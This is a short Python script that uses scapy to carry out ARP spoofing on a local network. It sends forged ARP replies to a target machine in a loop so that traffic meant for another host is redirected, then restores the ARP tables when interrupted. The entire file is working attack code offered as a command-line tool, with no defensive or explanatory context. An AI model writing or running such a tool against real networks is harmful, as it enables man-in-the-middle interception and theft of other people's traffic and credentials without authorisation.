import time

import scapy.all as scapy
import argparse

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--source", dest="source_ip", help="IP Address of the target.")
    parser.add_argument("-d", "--destination", dest="dest_ip", help="IP Address of the target.")
    arg = parser.parse_args()
    if not arg.source_ip:
        print("[+] Please specify an IP Address of the target machine,use --hlep for more infor ")
    if not arg.dest_ip:
        print("[+] Please specify an IP Address of the target machine,use --hlep for more infor ")
    return arg
def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    ans = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return ans[0][1].hwsrc
def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet,verbose=False)
def restore(destination_ip,source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,count=4,verbose=False)

packet_sent = 0
arg = get_args()
try:
    while True:
        spoof(arg.dest_ip,arg.source_ip)
        spoof(arg.dest_ip,arg.source_ip)
        packet_sent = packet_sent + 2
        print("\r[+] Packet Sents: " + str(packet_sent) ,end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected Ctrl C .....Reseting ARP tables........Please wait.\n")
    restore(arg.dest_ip,arg.source_ip)
    restore(arg.dest_ip,arg.source_ip)
